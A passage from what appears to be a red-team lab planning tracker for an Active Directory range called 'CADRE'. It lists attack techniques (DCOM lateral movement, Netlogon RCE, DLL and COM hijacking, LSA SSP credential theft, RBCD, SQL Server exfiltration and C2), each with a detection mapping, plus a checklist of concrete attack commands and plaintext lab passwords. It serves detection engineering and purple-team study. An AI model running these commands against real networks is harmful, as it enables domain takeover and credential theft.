| NTLM coercion | `CREATE EXTERNAL MODEL` + UNC path | Coerce SQL Server to authenticate to attacker SMB |
| C2 transport | `AI_GENERATE_EMBEDDINGS` | Embedding traffic as C2 channel — looks like legitimate AI |
| CLR C2 agent | CLR assembly + embeddings | In-memory .NET implant, communicates via embedding vectors |

**Detection (from article):**
1. SQL Audit: alert on `xp_cmdshell`, SQL Agent Jobs, CLR assemblies
2. SQL Audit: alert on `CREATE/ALTER/DROP EXTERNAL MODEL`
3. SQL ERRORLOG: alert on `external rest endpoint enabled`
4. Firewall: block egress HTTPS from SQL Server to unknown domains
5. Traffic baseline: compare C2 embedding traffic vs legitimate model traffic

**Why this is important:**
- Normalizes egress HTTPS from database engine (decades of "egress from DB = bad" heuristic breaks)
- 100MB payload limit enables massive data exfiltration
- NTLM coercion via UNC path — Microsoft says "not a security boundary" (won't fix)
- C2 traffic looks like legitimate AI model calls — hard to distinguish

**Lab status:** mbr02 runs SQL Server 2025 Developer Edition. AI features available for testing. Would require playbook update to `09-sql-wsus-verify.yml` to enable `external rest endpoint enabled` and `external AI runtimes enabled`.

**Study guide:** `05-study-guide/ref-mssql2025-ai-abuse.md`

---

### 32. DCOMIllusionist — Fileless DCOM Lateral Movement ⏳

**Source:** https://github.com/synacktiv/DCOMIllusionist
**Author:** Synacktiv (Hugo Vincent)
**Date:** 2026-06-11
**MITRE:** T1021.003 (Distributed COM), T1055 (Process Injection)
**Status:** ⏳ Pending — enhances item #21 (Cross-Session Activation)

**Relevance to CADRE:** Fileless lateral movement via DCOM + .NET deserialization. More advanced than Cross-Session Activation (item #21) — production-ready tool from Synacktiv. Supports cross-session execution, in-memory DLL loading, NTLM relay via `--curl`, and ysoserial payloads. No files written to disk.

**Campaign location:** Phase 5 — lateral movement from SYSTEM on mbr01. Enhances/supersedes item #21.

**Prerequisites:**
- Admin privileges on both attacking and target machine
- Domain-joined attacking machine (for cross-session auth)
- Network access between target and attacker (or use `--listen` for relay)

**Key capabilities:**

| Flag | What It Does |
|------|-------------|
| `--exec <cmd>` | Arbitrary command execution on target |
| `--load-dll <path>` | In-memory DLL loading (fileless) |
| `--curl <url>` | HTTP request as victim user → NTLM relay |
| `--session N` | Cross-session execution (run as user in session N) |
| `--list-sessions` | Enumerate interactive sessions on target |
| `--fake-clsid` | Create fake CLSID for low-priv exploitation |
| `--hku` | Exploit from low-priv via HKU (Performance Log Users / DCOM Users) |
| `--yso-b64 <b64>` | Execute ysoserial.net payload |

**How it works:**
1. .NET DCOM servers auto-deserialize incoming objects via `IManagedObject.GetSerializedBuffer`
2. Tool remotely modifies registry to associate .NET CLSID with AppID
3. Forges DCOM OBJREFs to redirect target to attacker machine
4. Target deserializes malicious .NET object → code execution
5. Cross-session: uses session moniker with AppID configured for Interactive User

**CADRE attack scenarios:**
- SYSTEM on mbr01 → `--exec whoami` on dc02
- Cross-session: `--session 1 --exec "cmd /c whoami"` (run as analyst_cloud)
- NTLM relay: `--session 1 --curl http://kali` (trigger auth as analyst_cloud → relay)
- In-memory DLL: `--load-dll payload.dll --dll-class Payload` (no disk artifacts)

**Detection:**
- Sysmon EID 1: process creation on target from DCOM
- Sysmon EID 13: registry modification to CLSID/AppID keys
- WinSec 4624: Type 3 logon from attacker machine
- Network: DCOM traffic on port 135 + dynamic port

**Study guide:** `05-study-guide/ref-dcom-illusionist.md`

---

### 33. CVE-2026-41089 — Netlogon RCE (Standalone Exercise) ⏳

**Source:** https://cert.europa.eu/publications/security-advisories/2026-007
**CVE:** CVE-2026-41089 (CVSS 9.8)
**Date:** 2026-06-10 (CERT-EU advisory)
**MITRE:** T1210 (Exploitation of Remote Services)
**Status:** ⏳ Pending — standalone exercise (not in main campaign)

**Relevance to CADRE:** Unauthenticated RCE on domain controllers via Netlogon stack-based buffer overflow. Sends specially crafted packets → SYSTEM privileges on DC. No credentials required. Actively exploited in the wild. All 3 CADRE DCs (dc01/dc02/dc03) are Server 2025 — likely unpatched (needs 10.0.26100.32772).

**Why standalone (not main campaign):**
- Unauthenticated DC compromise would short-circuit the entire credential chain (Phases 1-3 become unnecessary)
- CADRE's main campaign demonstrates misconfiguration-based attacks, not CVE exploits
- But valuable as a standalone exercise: tests detection of Netlogon exploitation, shows what happens when a critical CVE hits

**Exercise design:**
1. Run PoC exploit against dc02 from Kali → SYSTEM on DC
2. Capture telemetry (WinSec, Sysmon, Zeek, Suricata)
3. Build detection rules for Netlogon exploitation patterns
4. Compare with campaign's normal credential chain path

**Detection:**
- WinSec: 4624 (SYSTEM logon from unexpected source)
- Sysmon: EID 1 (process creation on DC from network)
- Zeek: Netlogon traffic patterns (port 135/49670)
- Suricata: exploit-specific signatures (if PoC is public)

**Status note:** PoC exploit may not be public yet. Test when available. If not exploitable, document as "patched" or "not testable."

---

### 34. DLL Hijacking — Persistence ⏳

**Source:** RTO-Windows-Persistence/06b.DLL-hijack.txt
**MITRE:** T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Hijack DLL loading by placing malicious DLL in search path before legitimate one. Executes in context of trusted signed binary — EDR sees legitimate process loading DLL. Survives reboots if target application is commonly used.

**Campaign location:** Phase 5 (Persistence) — after credential access.

**Detection:** Sysmon EID 7 (image loaded from non-standard path), EID 11 (DLL file creation).

---

### 35. COM Hijacking — Persistence ⏳

**Source:** RTO-Windows-Persistence/07b.COM-hijack-demo.txt
**MITRE:** T1546.015 (Event Triggered Execution: Component Object Model Hijacking)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Registry-based COM object hijacking. Modify CLSID registry keys to point to malicious DLL. Survives reboots. No scheduled tasks or services needed — fires when legitimate application requests the COM object.

**Campaign location:** Phase 5 (Persistence) — after credential access.

**Detection:** Sysmon EID 13 (registry value set under CLSID), EID 7 (DLL load from non-standard path).

---

### 36. IFEO (Image File Execution Options) — Persistence ⏳

**Source:** RTO-Windows-Persistence/11.IFEO.txt
**MITRE:** T1546.012 (Event Triggered Execution: Image File Execution Options)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Set debugger for any executable via IFEO registry key. When target application launches, debugger runs instead (or before). Can be used for persistence or process interception.

**Campaign location:** Phase 5 (Persistence) — after credential access.

**Detection:** Sysmon EID 13 (registry write to IFEO keys), EID 1 (debugger process creation).

---

### 37. LSA SSP / Password Filter — Credential Theft + Persistence ⏳

**Source:** RTO-Windows-Persistence/20b.LSA-SSP.AP.txt
**MITRE:** T1556.002 (Modify Authentication Process: Password Filter DLL)
**Status:** ⏳ Pending — Phase 5 persistence + credential access

**Relevance to CADRE:** Register a custom SSP (Security Support Provider) or Password Filter DLL in LSA. SSP intercepts every authentication event — captures plaintext passwords, NTLM hashes, and Kerberos tickets. Password Filter validates passwords at change time — captures new passwords. Both load at boot and persist in LSASS process memory.

**Campaign location:** Phase 5 (Persistence) — combines persistence with credential access.

**Detection:** Sysmon EID 7 (DLL loaded into lsass.exe), EID 13 (registry write to Security Packages or Notification Packages), WinSec 4624 (authentication events).

---

### 38. UACME — UAC Bypass ⏳

**Source:** RTO-Windows-PrivEsc/15.UACME.txt
**MITRE:** T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control)
**Status:** ⏳ Pending — Phase 3 execution

**Relevance to CADRE:** UAC bypass from local admin (medium integrity → high integrity). CADRE has SYSTEM via GodPotato, but UAC bypass is a distinct technique class. UACME project contains 70+ techniques, many still unfixed on Server 2025. Useful when you have local admin but UAC blocks execution.

**Campaign location:** Phase 3 (Execution) — alternative when GodPotato isn't available or UAC is enabled.

**Why this works on Server 2025:**
- Many UACME techniques are DLL hijacks on trusted binaries
- Unfixed techniques exist from Windows 7 through Server 2025
- UAC is enabled by default on member servers (not DCs)

**Detection:** Sysmon EID 1 (process creation with elevated integrity), EID 13 (registry modification for UAC bypass).

---

### 39. Named Pipe Impersonation (Piper) — Privilege Escalation ⏳

**Source:** RTO-Windows-PrivEsc/23.Piper-intro.txt + 24.Piper-demo.txt
**MITRE:** T1134.001 (Access Token Manipulation: Token Impersonation/Theft)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Named pipe impersonation via `ImpersonateNamedPipeClient`. Create a named pipe, wait for SYSTEM to connect (e.g., via service or scheduled task), impersonate the connecting client's token. Classic privilege escalation technique.

**Campaign location:** Phase 5 (Persistence) — token-based persistence/priv-esc.

**Why this works on Server 2025:**
- Named pipe impersonation is a legitimate Windows API
- Works when you can trigger SYSTEM to connect to your pipe
- Commonly used with PsExec-style service creation

**Detection:** Sysmon EID 17/18 (pipe create/connect), EID 1 (process creation via impersonated token).

---

### 40. Handle Leak Exploitation — Privilege Escalation ⏳

**Source:** RTO-Windows-PrivEsc/18.HandleLeak-intro.txt + 19-20.HandleLeak-demo.txt
**MITRE:** T1134 (Access Token Manipulation)
**Status:** ⏳ Pending — Phase 3 execution

**Relevance to CADRE:** Exploit leaked handles from privileged processes. If a SYSTEM process leaks a handle to its token or a privileged object, a lower-privileged process can use that handle to escalate. Kernel-level technique.

**Campaign location:** Phase 3 (Execution) — alternative privesc when GodPotato isn't available.

**Detection:** Sysmon EID 10 (process access — handle duplication), EID 1 (process creation with unusual parent).

---

### 41. Token Dance — Token Manipulation Persistence ⏳

**Source:** RTO-Windows-PrivEsc/21.TokenDance-intro.txt + 22.TokenDance-demo.txt
**MITRE:** T1134.001 (Access Token Manipulation: Token Impersonation/Theft)
**Status:** ⏳ Pending — Phase 5 persistence

**Relevance to CADRE:** Token manipulation techniques for persistence. Steal or duplicate tokens from privileged processes to maintain elevated access. Works alongside named pipe impersonation.

**Campaign location:** Phase 5 (Persistence) — token-based persistence.

**Detection:** Sysmon EID 10 (process access for token duplication), WinSec 4674 (operation on privileged object).

---

### 42. LAPS Extraction — Credential Access ✅

**Source:** RTO-Windows-PrivEsc/LAPS (Zero Point Security Red Team Ops 2025 module 24)
**MITRE:** T1552.004 (Unsecured Credentials: Private Keys)
**Status:** ✅ Adopted into CAMPAIGNS.md Branch 3.5 — 3.5L (LAPS Extraction). Full test plan + WinSec 4662 detection.

**Relevance to CADRE:** Local Administrator Password Solution (LAPS) manages unique local admin passwords per machine, stored in AD. If compromised, gives local admin on any LAPS-managed machine. Extraction requires specific AD permissions (Read LAPS password attribute).

**Campaign location:** Phase 3.5 (Credential Access) — after domain user access.

**Why this works on Server 2025:**
- LAPS passwords stored in AD as `ms-Mcs-AdmPwd` attribute
- Requires Read permission on the attribute (not default for regular users)
- Can be extracted via LDAP if permissions allow
- New LAPS (Windows LAPS) stores password in AD or Azure AD

**Detection:** WinSec 4662 (AD object access — reading LAPS password attribute), Sysmon EID 1 (LDAP query for LAPS attributes).

---

### 43. BetterSuccessor — dMSA Post-Patch Abuse (Server 2025) ⏳

**Source:** https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch
**MITRE:** T1558.004 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — extends item #23 (BadSuccessor + Golden dMSA)

**Relevance to CADRE:** After Microsoft patched BadSuccessor, Altered Security found that dMSA abuse still works post-patch via BetterSuccessor. Server 2025 specific. Extends item #23 with post-patch technique.

**Campaign location:** Phase 8 (Forest Trust) — after DCSync.

**Detection:** WinSec 4742 (computer account modification), Sysmon EID 13 (registry write to dMSA attributes).

---

### 44. RBCD — Resource-Based Constrained Delegation ⏳

**Source:** https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd
**MITRE:** T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)
**Status:** ⏳ Pending — Phase 5 lateral movement

**Relevance to CADRE:** ACE#20 gives `GenericWrite` on `mbr01$` — RBCD is the direct attack. Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on mbr01$ → impersonate any user. CADRE has the prerequisite (ACE#20) already deployed.

**Campaign location:** Phase 5 (Lateral Movement) — after Phase 4 BloodHound reveals ACE#20.

**Detection:** WinSec 4742 (computer account modification — msDS-AllowedToActOnBehalfOfOtherIdentity), Sysmon EID 13 (registry write).

---

### 45. Pass-the-Cert — Entra ID Lateral Movement via Certificates ⏳

**Source:** https://www.alteredsecurity.com/post/long-live-pass-the-cert-reviving-the-classical-rendition-of-lateral-movement-across-entra-id-joined
**MITRE:** T1078 (Valid Accounts)
**Status:** ⏳ Pending — Plan 11b (EntraGoat)

**Relevance to CADRE:** Certificate-based lateral movement across Entra ID-joined machines. Chains with ADCS certificate abuse (Branch B) → Entra ID authentication. Relevant for Plan 11 (Cloud/Hybrid) and EntraGoat integration.

**Campaign location:** Plan 11b (EntraGoat) — when cloud integration starts.

**Detection:** Entra ID sign-in logs (certificate-based auth), Azure AD audit logs.

---

### 46. DCSync Attack and Detection ⏳

**Source:** https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection
**MITRE:** T1003.006 (OS Credential Dumping: DCSync)
**Status:** ⏳ Pending — Phase 7 detection reference

**Relevance to CADRE:** Detection-focused article on DCSync. Complements plan1.7 Impacket IoCs (IoC 59/60 — DRSBind, DRSGetNCChanges). Useful for building Phase 7 detection rules.

**Campaign location:** Phase 7 (Privilege Escalation — DCSync) — detection reference.

**Detection:** WinSec 4662 (GetChanges + GetChangesAll on domain object), Zeek dce_rpc.log (DRSBind, DRSGetNCChanges).

---

### 47. Fantastic Windows Logon Types — Credential Location Reference ⏳

**Source:** https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them
**MITRE:** T1078 (Valid Accounts)
**Status:** ⏳ Pending — Phase 3.5 reference

**Relevance to CADRE:** Maps Windows logon types (Type 2 Interactive, Type 3 Network, Type 7 Unlock, Type 10 RemoteInteractive, etc.) to where credentials end up in LSASS. Directly useful for understanding which logon types leave creds accessible for Phase 3.5 credential theft.

**Campaign location:** Phase 3.5 (Credential Access) — study reference for understanding credential material in LSASS.

**Detection:** WinSec 4624 (logon type analysis), Sysmon EID 1 (process context).

---

## CAMPAIGNS.md Phase Mapping (Campaign Order)

| Phase | Suggestion # | Article | Status |
|:------|:-------------|:--------|:-------|
| Recon | 8 | RTFM | Reference only |
| Recon | 19 | ADWS Enumeration | ✅ Adopted — Phase 0 Step 3 (port 9389 open on all 3 DCs) |
| Phase 1 (Initial Access) | 14 | Shift Happens | ⏳ Negative test — likely patched |
| Phase 2 (Kerberoast) | 15 | Into The Rainbow | ✅ Adopted — Phase 2 NTLMv1 section |
| Phase 3 (SQL xp_cmdshell) | 1 | MSSQLHound | ✅ Adopted — Reconnaissance with svc_mssql |
| Branch 3.5 (Credential Theft) | 3 | Offensive DPAPI | ✅ Adopted — Branch 3.5G |
| Branch 3.5 (Credential Theft) | 4 | ctfmon.exe Extraction | ✅ Adopted — Branch 3.5H |
| Branch 3.5 (Credential Theft) | 8 | WMI Event Subscriptions | ✅ Adopted — Branch 3.5J |
| Branch 3.5 (Credential Theft) | 10 | Invisible Scheduled Tasks | ✅ Adopted — enhances 3.5B |
| Branch 3.5 (Credential Theft) | 20 | LSASS Dump via WerFault | ✅ Adopted — Branch 3.5K |
| Branch 3.5 (Credential Theft) | 28 | Credential Guard Bypass | ✅ Adopted — Study Reference Library |
| Phase 3.5 (Credential Access) | 42 | LAPS Extraction | ✅ Adopted — Branch 3.5L |
| Branch 3.5 (Credential Theft) | 25 | EntryPoint Hijacking | ⏳ Pending — code injection |
| Phase 3 (Execution) | 24 | WinGet Proxy Execution | ✅ Adopted — Phase 3 Alternative Execution |
| Phase 3 (Execution) | 27 | GAC Hijacking | ✅ Adopted — Phase 3 Alternative Execution |
| Phase 4 (BloodHound) | 1 | MSSQLHound | ✅ Adopted — BH import |
| Phase 4 (BloodHound) | 22 | SharpHound Detection | ✅ Adopted — Study Reference Library |
| Phase 5 (Lateral Movement) | 13 | ghostsurf | ✅ Adopted — Phase 5 |
| Phase 5 (Lateral Movement) | 21 | Cross-Session Activation | ⏳ Pending — COM lateral movement |
| Phase 5 (Lateral Movement) | 26 | SpeechRuntime Lateral | ⏳ Pending — novel lateral movement |
| Phase 5 (Lateral Movement) | 32 | DCOMIllusionist | ⏳ Pending — fileless DCOM lateral |
| Phase 5 (Persistence) | 34 | DLL Hijacking | ⏳ Pending — persistence |
| Phase 5 (Persistence) | 35 | COM Hijacking | ⏳ Pending — persistence |
| Phase 5 (Persistence) | 36 | IFEO | ⏳ Pending — persistence |
| Phase 5 (Persistence) | 37 | LSA SSP / Password Filter | ⏳ Pending — persistence + cred access |
| Phase 6 (Lateral Movement) | 44 | RBCD | ⏳ Pending — ACE#20 → mbr01$ impersonation |
| Phase 7 (DCSync) | 46 | DCSync Detection | ⏳ Pending — detection reference |
| Phase 8 (Forest Trust) | 43 | BetterSuccessor (dMSA post-patch) | ⏳ Pending — extends #23 |
| Phase 3.5 (Credential Access) | 47 | Logon Types Reference | ⏳ Pending — credential location ref |
| Plan 11 (Cloud/Entra) | 45 | Pass-the-Cert | ⏳ Pending — Entra ID lateral movement |
| Phase 5 (Persistence) | 39 | Named Pipe Impersonation | ⏳ Pending — priv-esc via pipe |
| Phase 5 (Persistence) | 41 | Token Dance | ⏳ Pending — token manipulation persistence |
| Phase 6 (Persistence) | 11 | Golden/Silver Ticket | ⏳ Pending — enhances Phase 6/7 |
| Phase 7 (Forest Trust) | 23 | BadSuccessor + Golden dMSA | ⏳ Pending — Server 2025 dMSA abuse |
| Branch B (ADCS) | 5 | Certified Pre-Owned | ✅ Adopted — Branch B |
| Branch B (ADCS) | 29 | UnPAC-the-Hash | ⏳ Pending — NT hash from certificate |
| Detection Engineering | 30 | ETW Internals | ⏳ Pending — telemetry tampering detection |
| Exercise (Standalone) | 33 | CVE-2026-41089 Netlogon RCE | ⏳ Pending — standalone DC exploit |
| Phase 3 (SQL xp_cmdshell) | 31 | SQL Server 2025 AI Abuse | ✅ Adopted — Phase 3 Alternative Execution |
| Phase 3 (Execution) | 38 | UACME | ⏳ Pending — UAC bypass |
| Phase 3 (Execution) | 40 | Handle Leak | ⏳ Pending — kernel handle leak privesc |
| Branch C (SCCM) | 7 | Ludus SCCM | ✅ Adopted — Branch C |
| Branch F (Supply-chain) | 6 | Shai-Hulud 2.0 | ✅ Adopted — Branch F |
| Research only | 2 | MSSQL + SCCM CVEs | 🔬 Not spine |
| Skip | 16 | Don't Jump Turnstile | ⏭️ No Cloudflare in lab |
| Future | 18 | Okta + BloodHound | Azure/Okta expansion |
| Reference | 17 | How We Think about Red Teaming | Methodology |
| Reference | 8 | RTFM | Lab design justification |

---

## Testing Checklist

| # | Article | Test Command | Expected Result | Telemetry |
|:--|:--------|:-------------|:----------------|:----------|
| 1 | MSSQLHound ✅ | `/tmp/mssqlhound -u svc_mssql -p s3rv1c3_MSSQL! -d child.cadre.local -t 192.168.77.22 --collect-from-linked` | SQL attack paths | SQL logs |
| 2 | MSSQL + SCCM CVEs 🔬 | Check CVE status on mbr01/mbr02 | Exploit chain | SQL/SCCM logs |
| 3 | Offensive DPAPI ✅ | Nemesis DPAPI extraction | Saved credentials | Sysmon EID 1/10 |
| 4 | ctfmon.exe ✅ | `procdump -ma ctfmon.exe ctfmon.dmp` | Typed passwords in dump | Sysmon EID 10 |
| 5 | Certified Pre-Owned ✅ | `certipy find -u intern_blue@child.cadre.local -p '1nt3rn_Blu3!' -dc-ip 192.168.77.11` | List vulnerable templates | Sysmon EID 1 |
| 5 | Certified Pre-Owned ✅ | ESC1: `certipy req -u analyst_t1@child.cadre.local -p 'T13r_An@lyst!' -ca cadre-CA -template CADRE-ESC1 -upn Administrator@cadre.local -dc-ip 192.168.77.10` | Admin certificate | Cert Services EID 4886 |
| 6 | Shai-Hulud 2.0 ✅ | NPMHound collection | npm supply-chain paths | npm audit |
| 7 | Ludus SCCM ✅ | ConfigManBearPig collection | SCCM attack paths | SCCM logs |
| 8 | WMI Event Subscriptions ✅ | WMI subscription install via SYSTEM | Fileless persistence | Sysmon 19/20/21 |

| 10 | Invisible Scheduled Tasks ✅ | `reg delete ...Security /f` | Task invisible to schtasks | Sysmon 12/13 |
| 11 | Golden/Silver Ticket ⏳ | `ticketer.py -nthash <KRBTGT_HASH> ...` | Forged TGT | Sysmon 1, 3 |
| 12 | Device Code Phishing ⏳ | Generate device code via OAuth | Session token capture | Network logs |
| 13 | ghostsurf ✅ | ntlmrelayx SOCKS proxy | SMB session hijack | Zeek smb.log |
| 14 | Shift Happens ⏳ | Context menu test | Command injection | Sysmon EID 1 |
| 15 | Into The Rainbow ⏳ | NTLMv1 rainbow lookup | Hash cracked | N/A |
| 19 | ADWS Enumeration ⏳ | `nmap -p 9389 --script=adws-enum` or SOAP client | AD users/groups via ADWS | WinSec 4624 |
| 20 | LSASS Dump via WerFault ⏳ | WerFaultSecure LSASS dump | Credential extraction | Sysmon EID 10 |
| 21 | Cross-Session Activation ⏳ | COM activation in remote session | Lateral movement | Sysmon EID 1 |
| 22 | SharpHound Detection ⏳ | Run SharpHound, review detection | BH collection telemetry | Sysmon EID 1, WinSec 4624 |
| 23 | BadSuccessor + Golden dMSA ⏳ | dMSA creation + abuse | dMSA persistence | WinSec 4742 |
| 24 | WinGet Proxy Execution ✅ | `winget install --source winget` from SYSTEM | LOLBAS execution | Sysmon EID 1, 11 |
| 25 | EntryPoint Hijacking ⏳ | Write code to memory, trigger via process run | Stealthy injection | Sysmon EID 10 |
| 26 | SpeechRuntime Lateral ⏳ | Execute via SpeechRuntime.exe | Novel lateral movement | Sysmon EID 1, 3 |
| 27 | GAC Hijacking ✅ | Drop assembly to GAC path | .NET injection | Sysmon EID 11, 7 |
| 28 | Credential Guard Bypass ⏳ | Study reference — CG architecture + bypasses | N/A (reference) | N/A |
| 29 | UnPAC-the-Hash ⏳ | `certipy auth -pfx administrator.pfx` | NT hash from PKINIT TGT | WinSec 4768, 4769 |
| 30 | ETW Internals ⏳ | Study reference — ETW architecture + tampering | N/A (detection ref) | N/A |
| 31 | SQL Server 2025 AI Abuse ✅ | `sp_invoke_external_rest_endpoint` + `CREATE EXTERNAL MODEL` | SQL exfil/coercion/C2 | SQL Audit |
| 32 | DCOMIllusionist ⏳ | `DCOMIllusionist.exe -t <target> --exec whoami` | Fileless DCOM lateral | Sysmon EID 1, 13 |
| 33 | CVE-2026-41089 Netlogon ⏳ | PoC exploit against dc02 | Unauthenticated DC RCE | WinSec 4624, Sysmon EID 1 |
| 34 | DLL Hijacking ⏳ | Drop DLL to search path + trigger app | Persistence via trusted binary | Sysmon EID 7, 11 |
| 35 | COM Hijacking ⏳ | Modify CLSID registry → malicious DLL | Registry persistence | Sysmon EID 13, 7 |
| 36 | IFEO ⏳ | Set debugger on target exe | Persistence via IFEO | Sysmon EID 13, 1 |
| 37 | LSA SSP / Password Filter ⏳ | Register SSP DLL in LSA | Persistence + cred theft | Sysmon EID 7, 13 |
| 38 | UACME ⏳ | UACME.exe <technique> | UAC bypass | Sysmon EID 1 |
| 39 | Named Pipe Impersonation ⏳ | Create pipe + trigger SYSTEM connect | Priv-esc via pipe | Sysmon EID 17, 18 |
| 40 | Handle Leak ⏳ | Exploit leaked handle from privileged proc | Kernel privesc | Sysmon EID 10 |
| 41 | Token Dance ⏳ | Token duplication from privileged proc | Token persistence | Sysmon EID 10 |
| 42 | LAPS Extraction ✅ | LDAP query for ms-Mcs-AdmPwd | Local admin cred access | WinSec 4662 |
| 43 | BetterSuccessor ⏳ | dMSA post-patch abuse | Priv-esc via dMSA | WinSec 4742 |
| 44 | RBCD ⏳ | Write msDS-AllowedToActOnBehalfOfOtherIdentity on mbr01$ | Lateral movement via delegation | WinSec 4742 |
| 45 | Pass-the-Cert ⏳ | Certificate-based Entra ID auth | Cloud lateral movement | Entra sign-in logs |
| 46 | DCSync Detection ⏳ | Study reference — DRSBind/DRSGetNCChanges patterns | DCSync detection | WinSec 4662, Zeek dce_rpc |
| 47 | Logon Types ⏳ | Study reference — logon type → credential location | Credential access ref | WinSec 4624 |

---

## Integration Priority

1. **MSSQLHound** ✅ — already in CAMPAIGNS.md
2. **MSSQL + SCCM CVEs** 🔬 — research only, not spine
3. **ctfmon.exe Extraction** ✅ — already in CAMPAIGNS.md (Branch 3.5H)
4. **Offensive DPAPI** ✅ — already in CAMPAIGNS.md (Branch 3.5G)
5. **Certified Pre-Owned** ✅ — already in CAMPAIGNS.md (Branch B)
6. **Shai-Hulud 2.0** ✅ — already in CAMPAIGNS.md (Branch F)
7. **Ludus SCCM** ✅ — already in CAMPAIGNS.md (Branch C)
8. **ghostsurf** ✅ — already in CAMPAIGNS.md (Phase 5)
9. **WMI Event Subscriptions** ✅ — already in CAMPAIGNS.md (Branch 3.5J)
11. **Invisible Scheduled Tasks** ✅ — already in CAMPAIGNS.md (enhances 3.5B)
12. **Golden/Silver Ticket** ⏳ — new, enhances Phase 6/7
13. **Device Code Phishing** ⏳ — new, initial access vector
14. **Shift Happens** ⏳ — negative test (likely patched)
15. **Into The Rainbow** ⏳ — one-time check
16. **Don't Jump Turnstile** ⏭️ — skip, no Cloudflare in lab
19. **ADWS Enumeration** ⏳ — new, Phase 0 alternative enum
20. **LSASS Dump via WerFault** ⏳ — new, enhances 3.5F
21. **Cross-Session Activation** ⏳ — new, Phase 5 COM lateral
22. **SharpHound Detection** ⏳ — new, Phase 4 detection reference
23. **BadSuccessor + Golden dMSA** ⏳ — new, Phase 7 Server 2025
24. **WinGet Proxy Execution** ⏳ — new, LOLBAS
25. **EntryPoint Hijacking** ⏳ — new, code injection
26. **SpeechRuntime Lateral** ⏳ — new, lateral movement
27. **GAC Hijacking** ⏳ — new, .NET injection
28. **Credential Guard Bypass** ⏳ — new, study reference for 3.5F
29. **UnPAC-the-Hash** ⏳ — new, ADCS → NT hash chain
30. **ETW Internals** ⏳ — new, detection engineering reference
31. **SQL Server 2025 AI Abuse** ✅ — new, SQL exfil/coercion/C2
32. **DCOMIllusionist** ⏳ — new, fileless DCOM lateral movement
33. **CVE-2026-41089 Netlogon RCE** ⏳ — standalone exercise, unauthenticated DC exploit
34. **DLL Hijacking** ⏳ — Phase 5 persistence
35. **COM Hijacking** ⏳ — Phase 5 persistence
36. **IFEO** ⏳ — Phase 5 persistence
37. **LSA SSP / Password Filter** ⏳ — Phase 5 persistence + credential access
38. **UACME** ⏳ — Phase 3 UAC bypass
39. **Named Pipe Impersonation** ⏳ — Phase 5 priv-esc via pipe
40. **Handle Leak** ⏳ — Phase 3 kernel handle leak privesc
41. **Token Dance** ⏳ — Phase 5 token manipulation persistence
42. **LAPS Extraction** ⏳ — Phase 3.5 credential access
43. **BetterSuccessor (dMSA post-patch)** ⏳ — Phase 8, extends #23
44. **RBCD** ⏳ — Phase 6, ACE#20 on mbr01$
45. **Pass-the-Cert** ⏳ — Plan 11b, Entra ID lateral movement
46. **DCSync Detection** ⏳ — Phase 7, detection reference
47. **Logon Types Reference** ⏳ — Phase 3.5, credential location reference

---

## Additional Sources (Beyond SpecterOps)

### AD Attack Path & Lab Design
| Source | Why it helps CADRE |
|:-------|:-------------------|
| GOAD + OCD AD mindmap | Benchmark topology and technique ordering; use for coverage gaps |
| HackTricks — Active Directory Methodology | Quick technique index; good for walkthrough cross-links |
| PayloadsAllTheThings — Methodology and Resources | Command cheat sheet per phase |
| Podalirius (SCCM, GPO, ADCS posts) | Deep dives on Branch B/C — complements SpecterOps SCCM/ADCS |
| [iPurple.team](https://ipurple.team/) | Purple team techniques: COM lateral, LSASS dump, dMSA abuse, EDR evasion, SharpHound detection |

### Detection & Telemetry (after tracker)
| Source | Why it helps |
|:-------|:-------------|
| Sigma HQ | Plan 1 Sigma catalog — map rules to 99 attacks |
| Elastic Detection Rules | P0a pre-built rules |
| Mordor / Security Datasets | Sample events when attack is hard to re-run |
| LOLBAS | Map WT063-068, certutil, schtasks to process chains for cadre-e* rules |
| CAR (MITRE) | Analytics ideas per technique |

### ADCS / SQL / SCCM Tooling
| Source | Why |
|:-------|:----|
| certipy docs + ADCSKiller | Branch B — validate ESC coverage vs 08-adcs-verify.yml |
| SharpSCCM / SCCMHunter | Branch C — SharpSCCM for execution, SCCMHunter for path discovery |
| Impacket MSSQL examples | Phase 3 spine — linked-server edge cases |

### Server 2025 / Platform Reality
| Source | Why |
|:-------|:----|
| Microsoft Security blog / KBs | Justify 3.5F vs 3.5A vs 3.5G outcomes |
| Atomic Red Team (T1003, T1552, T1053) | Optional harness aligned to tracker rows |

### Internal (Highest Signal)
| Source | Why |
|:-------|:----|
| CAMPAIGNS-METADATA.md | Playbook refs per WT — link when promoted |
| attack-specifications.md | Ground truth for what's deployed |
| sql/adcs/sccm-integration-guide.md | Before any suggestion changes attack surface |
| tracker.md | Promotion criteria from suggestions → CAMPAIGNS |

## Near-Term Additions (High CADRE Fit, Not in Doc Yet)

1. **SCCMHunter** — mirror of MSSQLHound for Branch C
2. **BloodHound CE custom queries** — SQL/SCCM nodes once MSSQLHound/NPMHound import
3. **LOLBAS mapping table** — tie WT063-068 + 3.5B schtasks to detection fields
4. **GOAD technique diff** — one table: "GOAD has X, CADRE has Y (Server 2025 delta)"
5. **Golden/Silver Ticket** — AD persistence after DCSync (DbgMan)
6. **Device Code Phishing** — OAuth abuse initial access (DbgMan)
7. **ADWS Enumeration** — alternative enum via port 9389 (iPurple.team)
8. **LSASS Dump via WerFault** — Microsoft-signed binary for LSASS dump (iPurple.team)
9. **Cross-Session Activation** — COM-based lateral movement (iPurple.team)
10. **BadSuccessor + Golden dMSA** — Server 2025 dMSA abuse (iPurple.team)
11. **WinGet Proxy Execution** — LOLBAS via Windows Package Manager (iPurple.team)
12. **EntryPoint Hijacking** — stealthy code injection without thread creation (iPurple.team)
13. **SpeechRuntime Lateral** — novel lateral movement via Windows Speech (iPurple.team)
